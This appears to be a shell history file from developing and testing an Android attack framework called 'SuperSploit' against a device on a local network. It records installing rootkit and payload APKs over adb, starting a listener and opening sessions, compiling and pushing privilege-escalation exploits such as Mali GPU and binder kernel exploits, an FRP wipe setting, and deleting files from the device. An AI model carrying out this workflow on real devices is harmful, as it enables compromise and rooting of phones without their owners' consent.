+# 2026-06-07 10:30:18.514475
++cd ss
+
+# 2026-06-07 10:30:20.362276
++cd .data/.assets
+
+# 2026-06-07 10:30:28.457297
++ls
+
+# 2026-06-07 10:30:54.550182
++cd ~/Documents/SUpersploit-private-assets/logs
+
+# 2026-06-07 10:30:57.029981
++cd ~/Documents/SUpersploit-private-assets/logos
+
+# 2026-06-07 10:31:05.261084
++cd ~/Documents/Supersploit-private-assets/logos
+
+# 2026-06-07 10:31:33.721990
++cd $HOME/Documents/Supersploit-private-assets/logos
+
+# 2026-06-07 10:31:55.124536
++cd home/donald/Documents/Supersploit-private-assets/logos
+
+# 2026-06-07 10:31:59.694694
++ls /home
+
+# 2026-06-07 10:32:11.893197
++ls /home/donald/Documents
+
+# 2026-06-07 10:32:38.762220
++cd home/donald/Documents/Supersploit-private-assets
+
+# 2026-06-07 10:32:51.040738
++cd /home/donald/Documents/Supersploit-private-assets/logos
+
+# 2026-06-07 10:32:52.880384
++clear
+
+# 2026-06-07 10:33:01.880574
++sudo cp Logo1_v2_mini.png /usr/share/icons/hicolor/16x16/apps/logo1.png
+
+# 2026-06-07 10:35:04.121746
++clear
+
+# 2026-06-07 10:35:05.073229
++ls
+
+# 2026-06-07 10:35:23.790972
++help generate-apk-buildozer
+
+# 2026-06-07 10:36:29.455793
++clear
+
+# 2026-06-07 10:36:42.526222
++nano /test-todo.md
+
+# 2026-06-07 10:41:24.505077
++'
+
+# 2026-06-07 10:41:28.170099
++ls
+
+# 2026-06-07 10:42:06.623962
++clear
+
+# 2026-06-07 10:42:14.063082
++ls payloads/android
+
+# 2026-06-07 10:42:17.646693
++cd ss
+
+# 2026-06-07 10:42:19.814517
++ls payloads/android
+
+# 2026-06-07 10:42:21.990146
++clear
+
+# 2026-06-07 10:42:43.756812
++mv payloads/android/rootkit payloads/android/rootkit.apk
+
+# 2026-06-07 10:43:09.814815
++adb shell pm -l | grep "supersploit"
+
+# 2026-06-07 10:43:14.135900
++adb connect 192.168.37.228
+
+# 2026-06-07 10:43:17.117954
++adb shell pm -l | grep "supersploit"
+
+# 2026-06-07 10:44:17.440321
++adb shell pm -l
+
+# 2026-06-07 10:44:29.855781
++clear
+
+# 2026-06-07 10:44:32.023764
++adb shell pm -l | grep "supersploit"
+
+# 2026-06-07 10:44:40.215148
++adb uninstall org.supersploit.stub
+
+# 2026-06-07 10:44:57.204515
++adb install payloads/android/rootkit.apk
+
+# 2026-06-07 10:45:03.952107
++ls payloads/android
+
+# 2026-06-07 10:45:07.845454
++cd ss
+
+# 2026-06-07 10:45:09.575631
++adb install payloads/android/rootkit.apk
+
+# 2026-06-07 10:46:52.631708
++cd ss
+
+# 2026-06-07 10:46:57.832084
++cd source/tools
+
+# 2026-06-07 10:47:00.089696
++ls
+
+# 2026-06-07 10:47:14.888043
++python3 run_listener.py
+
+# 2026-06-07 10:47:36.649302
++adb devices
+
+# 2026-06-07 10:49:32.742571
++generate-apk-buildozer
+
+# 2026-06-07 10:50:24.440332
++[SuperSploit]: 
+
+# 2026-06-07 10:50:37.465560
++clear
+
+# 2026-06-07 10:53:29.809438
++set LISTENER true
+
+# 2026-06-07 10:53:35.434830
++set host 192.168.37.158
+
+# 2026-06-07 10:53:37.026991
++set LISTENER true
+
+# 2026-06-07 10:54:30.652855
++ip addr
+
+# 2026-06-07 10:54:48.824636
++clear
+
+# 2026-06-07 10:54:54.432535
++show
+
+# 2026-06-07 10:55:25.809535
++set LHOST 192.168.37.158
+
+# 2026-06-07 10:55:27.619094
++run
+
+# 2026-06-07 10:55:46.232162
++set LISTENER true
+
+# 2026-06-07 10:58:31.086653
++clear
+
+# 2026-06-07 10:58:39.123495
++ps aux | grep "python3"
+
+# 2026-06-07 10:59:06.853940
++netstat an
+
+# 2026-06-07 10:59:09.663658
++clear
+
+# 2026-06-07 10:59:24.717066
++netstat an | grep :5000"
+
+# 2026-06-07 10:59:29.971989
++netstat an | grep ":5000"
+
+# 2026-06-07 10:59:32.756411
++netstat an | grep "5000"
+
+# 2026-06-07 10:59:38.845358
++netstat an | grep "5"
+
+# 2026-06-07 10:59:46.206290
++netstat -an | grep "5"
+
+# 2026-06-07 10:59:50.462809
++netstat | grep "5"
+
+# 2026-06-07 11:00:12.048669
++clear
+
+# 2026-06-07 11:00:15.104983
++netstat
+
+# 2026-06-07 11:00:21.394006
++netstat | grep "5"
+
+# 2026-06-07 11:00:30.257691
++netstat | grep "5000"
+
+# 2026-06-07 11:00:33.793906
++netstat | grep "500"
+
+# 2026-06-07 11:00:48.843018
++clear
+
+# 2026-06-07 11:00:53.106587
++man netstat
+
+# 2026-06-07 11:01:27.891053
++netstat -n | grep "500"
+
+# 2026-06-07 11:01:36.242788
++netstat -n | grep "192.168"
+
+# 2026-06-07 11:01:58.514731
++set LISTENER true
+
+# 2026-06-07 11:02:03.474975
++netstat -n | grep "192.168"
+
+# 2026-06-07 11:04:01.859443
++clear
+
+# 2026-06-07 11:04:38.654500
++sessions -i 1
+
+# 2026-06-07 11:04:54.519696
++sessions -i 2
+
+# 2026-06-07 11:05:15.009291
++exit
+
+# 2026-06-07 11:05:19.689868
++set LISTENER true
+
+# 2026-06-07 11:05:50.995017
++clear
+
+# 2026-06-07 11:05:53.435351
++sessions -i 2
+
+# 2026-06-07 11:06:24.085498
++exit
+
+# 2026-06-07 11:06:34.780704
++generate-apk rootkit
+
+# 2026-06-07 11:06:40.977300
++adb uninstall org.supersploit.stub
+
+# 2026-06-07 11:08:11.970034
++clear
+
+# 2026-06-07 11:08:23.685506
++adb install payloads/android/payload.apk
+
+# 2026-06-07 11:08:27.405197
++cd ss
+
+# 2026-06-07 11:08:28.558267
++adb install payloads/android/payload.apk
+
+# 2026-06-07 11:08:44.182785
++clear
+
+# 2026-06-07 11:08:47.006073
++set LISTENER true
+
+# 2026-06-07 11:09:32.071475
++sessions -i 1
+
+# 2026-06-07 11:10:59.174954
++exit
+
+# 2026-06-07 11:11:22.059525
++search exploits android
+
+# 2026-06-07 11:11:30.134412
++search exploits lpe
+
+# 2026-06-07 11:11:42.991114
++search exploits android enum'
+
+# 2026-06-07 11:11:44.925070
++search exploits android enum
+
+# 2026-06-07 11:11:53.558023
++clear
+
+# 2026-06-07 11:13:09.010446
++help compile
+
+# 2026-06-07 11:13:26.459576
++search payloads enum
+
+# 2026-06-07 11:13:37.252392
++search payloads android
+
+# 2026-06-07 11:13:46.765057
++clear
+
+# 2026-06-07 11:13:51.940814
++search payloads android
+
+# 2026-06-07 11:13:57.382460
++update-info
+
+# 2026-06-07 11:13:59.741706
++search payloads android
+
+# 2026-06-07 11:14:03.814014
++search payloads
+
+# 2026-06-07 11:16:50.573157
++ls
+
+# 2026-06-07 11:19:16.818856
++search payloads
+
+# 2026-06-07 11:19:46.306626
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 11:20:09.977577
++help compile
+
+# 2026-06-07 11:21:03.098570
++set COMP_ARCH  android_arm64
+
+# 2026-06-07 11:21:08.914553
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 11:21:54.941188
++adb push payloads/android_lpe_enum_android_arm64 /sdcard/lpe
+
+# 2026-06-07 11:22:01.149139
++clear
+
+# 2026-06-07 11:22:08.523852
++adb shell
+
+# 2026-06-07 11:23:37.556225
++clear
+
+# 2026-06-07 11:24:06.172310
++adb shell su -c chmod +x /sdcard/lpe
+
+# 2026-06-07 11:24:21.716428
++adb shell
+
+# 2026-06-07 11:28:25.925717
++set COMP_ARCH armeabi-v7a
+
+# 2026-06-07 11:28:30.038494
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 11:28:56.621798
++set COMP_ARCH armv7
+
+# 2026-06-07 11:28:59.885714
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 11:29:12.861832
++set COMP_ARCH  android_arm64
+
+# 2026-06-07 11:29:17.117780
++clear
+
+# 2026-06-07 11:29:20.253768
++help compile
+
+# 2026-06-07 11:29:47.008247
++adb shell lpe
+
+# 2026-06-07 11:29:58.000060
++adb shell su -c lpe
+
+# 2026-06-07 11:34:35.613210
++help compile
+
+# 2026-06-07 11:34:40.693054
++exit
+
+# 2026-06-07 11:34:48.277232
++help compile
+
+# 2026-06-07 11:35:36.702326
++clear
+
+# 2026-06-07 11:35:38.942499
++help compile
+
+# 2026-06-07 11:36:00.495549
++set COMP_ARCH  android_arm
+
+# 2026-06-07 11:36:04.007826
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 11:36:09.631889
++adb push payloads/android_lpe_enum_android_arm64 /sdcard/lpe
+
+# 2026-06-07 11:36:45.625035
++adb shell su -c mv /sdcard/lpe /sbin/lpe
+
+# 2026-06-07 11:37:01.833452
++clear
+
+# 2026-06-07 11:37:06.345785
++adb push payloads/android_lpe_enum_android_arm /sdcard/lpe
+
+# 2026-06-07 11:37:09.649910
++ls payloads/android
+
+# 2026-06-07 11:37:13.033920
++cd ss
+
+# 2026-06-07 11:37:14.929846
++ls payloads/android
+
+# 2026-06-07 11:37:19.321981
++ls payloads/
+
+# 2026-06-07 11:37:34.394943
++adb push payloads/android_lpe_enum_android_arm /sdcard/lpe
+
+# 2026-06-07 11:37:42.642132
++adb shell su -c mv /sdcard/lpe /sbin/lpe
+
+# 2026-06-07 11:38:11.315713
++adb shell su -c chown root /sbin/lpe
+
+# 2026-06-07 11:38:26.940006
++adb shell su -c chmod +x /sbin/lpe
+
+# 2026-06-07 11:38:34.588974
++adb shell su -c /sbin/lpe
+
+# 2026-06-07 11:38:51.716454
++adb shell /sbin/lpe
+
+# 2026-06-07 11:39:05.485692
++adb push payloads/android_lpe_enum_android_arm /sdcard/lpe
+
+# 2026-06-07 11:50:34.034771
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe
+
+# 2026-06-07 11:50:57.393114
++adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 11:51:00.224790
++clear
+
+# 2026-06-07 11:51:14.433399
++adb shell ./data/tmp/local/lpe
+
+# 2026-06-07 11:51:20.185473
++adb shell
+
+# 2026-06-07 11:57:51.406003
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 11:57:57.845763
++cd ss
+
+# 2026-06-07 11:58:04.687909
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe
+
+# 2026-06-07 11:58:15.198829
++adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 11:59:07.702713
++exit
+
+# 2026-06-07 11:59:33.215451
++compile payloads/android_lpe_enum.c
+
+# 2026-06-07 11:59:38.390817
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe
+
+# 2026-06-07 11:59:41.470329
++clear
+
+# 2026-06-07 12:08:17.287494
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 12:09:03.866664
++adb push payloads/android/android_lpe_enum_android_arm /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 12:09:34.052385
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 12:10:15.007269
++cd ss
+
+# 2026-06-07 12:10:16.504080
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 12:12:16.391101
++clear
+
+# 2026-06-07 12:15:22.762478
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 12:15:29.634863
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 12:21:06.704686
++clear
+
+# 2026-06-07 12:21:10.569244
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 12:21:40.218473
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 12:52:52.166964
++set FRP_WIPE true
+
+# 2026-06-07 12:53:01.055688
++search exploits android gad
+
+# 2026-06-07 12:53:32.296723
++use exploit 9
+
+# 2026-06-07 12:53:35.473302
++exploit
+
+# 2026-06-07 14:13:01.678595
++show
+
+# 2026-06-07 14:13:14.734761
++set LISTENER true
+
+# 2026-06-07 14:13:21.407041
++clear
+
+# 2026-06-07 14:22:31.357028
++exit
+
+# 2026-06-07 14:22:43.386349
++adb devices
+
+# 2026-06-07 14:23:38.649652
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 14:23:51.032424
++clear
+
+# 2026-06-07 14:23:53.392422
++compile payloads/android/android_lpe_enum.c
+
+# 2026-06-07 14:23:57.000432
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 14:24:02.992069
++cd ss
+
+# 2026-06-07 14:24:04.736061
++clear
+
+# 2026-06-07 14:24:06.760775
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 14:24:16.080541
++adb shell
+
+# 2026-06-07 14:27:11.797524
++compile payloads/android/android_lpe_enum2.c
+
+# 2026-06-07 14:27:48.853787
++adb push payloads/android_lpe_enum2_android_arm /data/local/tmp/lpe2 && adb shell chmod +x /data/local/tmp/lpe2
+
+# 2026-06-07 14:28:27.268726
++cd ss
+
+# 2026-06-07 14:28:28.637576
++adb push payloads/android_lpe_enum2_android_arm /data/local/tmp/lpe2 && adb shell chmod +x /data/local/tmp/lpe2
+
+# 2026-06-07 14:31:43.924471
++search exploits android rce
+
+# 2026-06-07 14:33:40.855714
++clear
+
+# 2026-06-07 14:40:29.969486
++search payloads android cve
+
+# 2026-06-07 14:40:51.074913
++compile payloads/android/android_lpe_cve_lookup.c
+
+# 2026-06-07 14:41:26.890471
++adb push payloads/android_lpe_cve_lookup_android_arm /data/local/tmp/lpe2 && adb shell chmod +x /data/local/tmp/lpe2
+
+# 2026-06-07 14:42:54.947640
++clear
+
+# 2026-06-07 14:42:57.875773
++adb shell
+
+# 2026-06-07 14:44:20.890627
++clear
+
+# 2026-06-07 14:44:32.461905
++adb push payloads/android_lpe_enum_android_arm /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 14:47:54.088993
++nano /test-todo.md
+
+# 2026-06-07 14:48:00.841816
++clear
+
+# 2026-06-07 15:04:46.349913
++clear
+
+# 2026-06-07 15:05:03.510287
++ls source/tools/
+
+# 2026-06-07 15:05:55.079357
++adb shell
+
+# 2026-06-07 15:06:52.080028
++ls
+
+# 2026-06-07 15:07:10.407897
++compile payloads/android/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:17:09.088481
++set COMP_ARCH android_v7; compile source/tools/android_lpe_enum.c; compile source/tools/android_lpe_cve_lookup.c; exit
+
+# 2026-06-07 15:17:42.849603
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:17:43.914839
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-07 15:17:44.079275
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:17:44.272745
++exit
+
+# 2026-06-07 15:18:12.742675
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:18:13.791031
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-07 15:18:13.968773
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:18:14.156667
++exit
+
+# 2026-06-07 15:19:06.865147
++clear
+
+# 2026-06-07 15:19:08.314027
++compile payloads/android/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:19:11.817204
++exit
+
+# 2026-06-07 15:19:41.204344
++show
+
+# 2026-06-07 15:19:53.205425
++compile payloads/android/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:20:38.593242
++clear
+
+# 2026-06-07 15:20:41.058254
++ls
+
+# 2026-06-07 15:21:36.366954
++compile payloads/android/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:22:48.907547
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:23:50.470893
++adb push payloads/android_lpe_cve_lookup_android_v7 /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 15:23:53.374658
++cd ss
+
+# 2026-06-07 15:23:55.999926
++clear
+
+# 2026-06-07 15:23:58.926977
++adb push payloads/android_lpe_cve_lookup_android_v7 /data/local/tmp/lpe && adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-07 15:24:12.584204
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:25:37.662567
++adb push payloads/android_lpe_cve_lookup_android_v7 /data/local/tmp/cve_lookup && adb shell chmod +x /data/local/tmp/cve_lookup
+
+# 2026-06-07 15:25:58.967128
++clear
+
+# 2026-06-07 15:28:23.759741
++adb pull /data/local/tmp/out.txt
+
+# 2026-06-07 15:28:32.689017
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 15:29:19.851949
++adb push payloads/android_lpe_enum2_android_arm /data/local/tmp/lpe2 && adb shell chmod +x /data/local/tmp/lpe2
+
+# 2026-06-07 15:29:36.172179
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 15:30:02.134058
++search payloads android enum
+
+# 2026-06-07 15:30:14.286137
++clear
+
+# 2026-06-07 15:30:46.860756
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-07 15:32:03.388456
++adb push payloads/android_lpe_enum_android_v7 /data/local/tmp/a && adb shell chmod +x /data/local/tmp/a
+
+# 2026-06-07 15:34:07.066820
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:34:08.118148
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-07 15:34:08.281643
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:34:08.472496
++exit
+
+# 2026-06-07 15:39:28.634313
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:39:29.691534
++compile source/tools/minifetch.c
+
+# 2026-06-07 15:39:29.815399
++exit
+
+# 2026-06-07 15:39:57.637001
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:39:58.701663
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-07 15:39:58.858782
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:39:59.049312
++compile source/tools/minifetch.c
+
+# 2026-06-07 15:39:59.162012
++exit
+
+# 2026-06-07 15:41:43.527457
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-07 15:42:00.375860
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 15:42:16.776420
++adb push payloads/android_lpe_enum_android_v7 /data/local/tmp/a && adb shell chmod +x /data/local/tmp/a
+
+# 2026-06-07 15:42:28.834428
++ls source/tools
+
+# 2026-06-07 15:42:47.761560
++compile source/tools/minifetch.c
+
+# 2026-06-07 15:44:06.236925
++adb push payloads/minifetch_android_v7 /data/local/tmp/minifetch && adb shell chmod +x /data/local/tmp/minifetch
+
+# 2026-06-07 15:44:20.325729
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:44:33.869801
++adb push payloads/android_lpe_cve_lookup_android_v7 /data/local/tmp/cve_lookup && adb shell chmod +x /data/local/tmp/cve_lookup
+
+# 2026-06-07 15:46:29.362386
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:46:30.412716
++compile source/tools/minifetch.c
+
+# 2026-06-07 15:46:30.549180
++exit
+
+# 2026-06-07 15:46:44.010382
++compile source/tools/minifetch.c
+
+# 2026-06-07 15:46:50.211198
++adb push payloads/minifetch_android_v7 /data/local/tmp/minifetch && adb shell chmod +x /data/local/tmp/minifetch
+
+# 2026-06-07 15:48:00.522380
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:48:01.564023
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-07 15:48:01.746425
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:48:01.922443
++compile source/tools/minifetch.c
+
+# 2026-06-07 15:48:02.048842
++exit
+
+# 2026-06-07 15:54:05.089239
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:54:06.164551
++compile source/tools/test_ssl.c
+
+# 2026-06-07 15:54:06.406369
++exit
+
+# 2026-06-07 15:54:33.659082
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:54:34.707236
++compile source/tools/minish.c
+
+# 2026-06-07 15:54:34.997157
++exit
+
+# 2026-06-07 15:54:58.727623
++set COMP_ARCH android_v7
+
+# 2026-06-07 15:54:59.791691
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-07 15:54:59.963472
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:55:00.149658
++compile source/tools/minish.c
+
+# 2026-06-07 15:55:00.253423
++exit
+
+# 2026-06-07 15:55:43.006014
++compile source/tools/minish.c
+
+# 2026-06-07 15:56:34.304263
++adb push payloads/minish_android_v7 /data/local/tmp/minish && adb shell chmod +x /data/local/tmp/minish
+
+# 2026-06-07 15:56:38.511678
++adb devices
+
+# 2026-06-07 15:56:49.183760
++adb push payloads/minish_android_v7 /data/local/tmp/minish && adb shell chmod +x /data/local/tmp/minish
+
+# 2026-06-07 15:57:45.769108
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-07 15:57:57.481260
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-07 15:58:06.826338
++adb push payloads/android_lpe_cve_lookup_android_v7 /data/local/tmp/cve_lookup && adb shell chmod +x /data/local/tmp/cve_lookup
+
+# 2026-06-07 15:58:23.386436
++adb push payloads/android_lpe_enum_android_v7 /data/local/tmp/a && adb shell chmod +x /data/local/tmp/a
+
+# 2026-06-07 16:01:29.967247
++set COMP_ARCH android_v7
+
+# 2026-06-07 16:01:31.013912
++compile source/tools/minish.c
+
+# 2026-06-07 16:01:31.128778
++exit
+
+# 2026-06-07 16:09:15.022365
++compile source/tools/minish.c
+
+# 2026-06-07 16:09:39.871579
++adb push payloads/minish_android_v7 /data/local/tmp/minish && adb shell chmod +x /data/local/tmp/minish
+
+# 2026-06-07 16:11:21.944798
++set COMP_ARCH android_v7
+
+# 2026-06-07 16:11:22.989612
++compile source/tools/minish.c
+
+# 2026-06-07 16:11:23.125019
++exit
+
+# 2026-06-07 16:11:52.524977
++compile source/tools/minish.c
+
+# 2026-06-07 16:11:56.772534
++adb push payloads/minish_android_v7 /data/local/tmp/minish && adb shell chmod +x /data/local/tmp/minish
+
+# 2026-06-07 16:12:39.774557
++clear
+
+# 2026-06-07 16:12:49.414878
++search payloads
+
+# 2026-06-07 16:12:53.615088
++clear
+
+# 2026-06-07 16:13:52.121447
++adb pull /data/local/tmp/out.txt 
+
+# 2026-06-07 16:13:54.057310
++ls
+
+# 2026-06-07 16:14:27.050829
++adb pull /data/local/tmp/out1.txt 
+
+# 2026-06-07 16:16:37.651634
++set COMP_ARCH android_v7
+
+# 2026-06-07 16:16:38.706268
++compile exploits/android/android11_kaslr_leak.c
+
+# 2026-06-07 16:16:38.846036
++compile exploits/android/badbinder_full.c
+
+# 2026-06-07 16:16:38.984227
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 16:16:39.115828
++compile exploits/android/cve_2023_4211_mali_gpu.c
+
+# 2026-06-07 16:16:39.205270
++exit
+
+# 2026-06-07 16:19:47.263421
++ls
+
+# 2026-06-07 16:19:57.345098
++deploy_lpe.sh
+
+# 2026-06-07 16:20:01.040532
++ls
+
+# 2026-06-07 16:20:12.625071
++bash deploy_lpe.sh
+
+# 2026-06-07 16:24:42.399550
++set COMP_ARCH android_v7
+
+# 2026-06-07 16:24:43.457584
++compile exploits/android/badbinder_full.c
+
+# 2026-06-07 16:24:43.574853
++exit
+
+# 2026-06-07 16:27:53.015778
++set COMP_ARCH android_v7
+
+# 2026-06-07 16:27:54.060648
++compile exploits/android/android11_kaslr_leak.c
+
+# 2026-06-07 16:27:54.212936
++compile exploits/android/badbinder_full.c
+
+# 2026-06-07 16:27:54.318024
++exit
+
+# 2026-06-07 16:30:59.059817
++set COMP_ARCH android_v7
+
+# 2026-06-07 16:31:00.133094
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 16:31:00.261909
++exit
+
+# 2026-06-07 16:32:26.137318
++set COMP_ARCH android_v7
+
+# 2026-06-07 16:32:27.207949
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 16:32:27.368277
++compile exploits/android/cve_2023_4211_mali_gpu.c
+
+# 2026-06-07 16:32:27.499589
++exit
+
+# 2026-06-07 16:34:24.374323
++set COMP_ARCH android_v7
+
+# 2026-06-07 16:34:25.433345
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 16:34:25.574688
++compile exploits/android/cve_2023_4211_mali_gpu.c
+
+# 2026-06-07 16:34:25.657403
++exit
+
+# 2026-06-07 16:39:59.997995
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 16:40:04.070174
++bash deploy_lpe.sh
+
+# 2026-06-07 16:40:30.131357
++clear
+
+# 2026-06-07 16:40:50.159702
++bash deploy_lpe.sh
+
+# 2026-06-07 16:41:55.313996
++cd ss
+
+# 2026-06-07 16:41:57.730015
++bash deploy_lpe.sh
+
+# 2026-06-07 16:48:31.128904
++clear
+
+# 2026-06-07 16:48:45.880404
++adb connect 192.168.37.228
+
+# 2026-06-07 16:49:15.640237
++set LISTENER true
+
+# 2026-06-07 16:50:10.571471
++sessions -i 1
+
+# 2026-06-07 16:50:42.884784
++ls payloads
+
+# 2026-06-07 16:51:08.725931
++cd payloads
+
+# 2026-06-07 16:51:11.558697
++pwd
+
+# 2026-06-07 16:51:22.710600
++sessions -i 1
+
+# 2026-06-07 16:55:15.110682
++clear
+
+# 2026-06-07 16:57:39.564553
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 16:57:58.925475
++adb -s 192.168.37.228:5555 shell rm /data/local/tmp/*
+
+# 2026-06-07 16:58:14.782201
++adb disconnect
+
+# 2026-06-07 16:58:18.095785
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 16:58:42.705435
++set COMP_ARCH android_v7
+
+# 2026-06-07 16:58:43.765182
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 16:58:43.987283
++compile exploits/android/cve_2023_4211_mali_gpu.c
+
+# 2026-06-07 16:58:44.095115
++exit
+
+# 2026-06-07 17:02:49.359969
++clear
+
+# 2026-06-07 17:02:59.886926
++bash deploy_lpe.sh
+
+# 2026-06-07 17:03:04.783554
++cd ss
+
+# 2026-06-07 17:03:06.959882
++bash deploy_lpe.sh
+
+# 2026-06-07 17:10:28.262617
++sessions -i 2
+
+# 2026-06-07 17:13:23.383122
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:13:24.460131
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 17:13:24.764635
++exit
+
+# 2026-06-07 17:13:26.780781
++show
+
+# 2026-06-07 17:13:36.069262
++generate-apk-buildozer
+
+# 2026-06-07 17:13:38.071364
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:13:39.112079
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 17:13:39.388125
++exit
+
+# 2026-06-07 17:14:37.784913
++exit
+
+# 2026-06-07 17:14:44.511260
++bash deploy_lpe.sh
+
+# 2026-06-07 17:14:47.151158
++cd ss
+
+# 2026-06-07 17:14:48.887241
++bash deploy_lpe.sh
+
+# 2026-06-07 17:15:03.515987
++set LISTENER true
+
+# 2026-06-07 17:15:07.831424
++clear
+
+# 2026-06-07 17:16:24.472717
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:16:25.533448
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 17:16:25.827571
++exit
+
+# 2026-06-07 17:16:34.427190
++adb ssessions 
+
+# 2026-06-07 17:16:44.446929
++sessions -i 2
+
+# 2026-06-07 17:16:46.403116
++sessions -i 1
+
+# 2026-06-07 17:16:51.049786
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:16:52.109287
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 17:16:52.187654
++exit
+
+# 2026-06-07 17:17:08.247200
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:17:09.316390
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 17:17:09.400645
++exit
+
+# 2026-06-07 17:17:36.473152
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:17:37.525581
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 17:17:37.781923
++exit
+
+# 2026-06-07 17:19:02.030730
++generate-apk-buildozer
+
+# 2026-06-07 17:19:46.705871
++sessions -i 1
+
+# 2026-06-07 17:20:53.362229
++clear
+
+# 2026-06-07 17:20:59.666541
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-07 17:21:09.122693
++bash deploy_lpe.sh
+
+# 2026-06-07 17:21:46.235739
++search exploitsmali
+
+# 2026-06-07 17:21:49.796328
++search exploits mali
+
+# 2026-06-07 17:22:11.718861
++compile /home/donald/.SuperSploit/exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 17:23:09.958651
++compile /home/donald/.SuperSploit/exploits/android/cve_2023_4211_mali_gpu.c
+
+# 2026-06-07 17:23:15.566625
++clear
+
+# 2026-06-07 17:23:23.303149
++search exploits kaslr
+
+# 2026-06-07 17:23:36.471399
++compile /home/donald/.SuperSploit/exploits/android/android11_kaslr_leak.c 
+
+# 2026-06-07 17:23:47.312355
++compile /home/donald/.SuperSploit/exploits/android/legacy_kaslr_leak.c
+
+# 2026-06-07 17:23:49.271765
++clear
+
+# 2026-06-07 17:23:59.176103
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 17:24:02.784749
++bash deploy_lpe.sh
+
+# 2026-06-07 17:24:09.928507
++clear
+
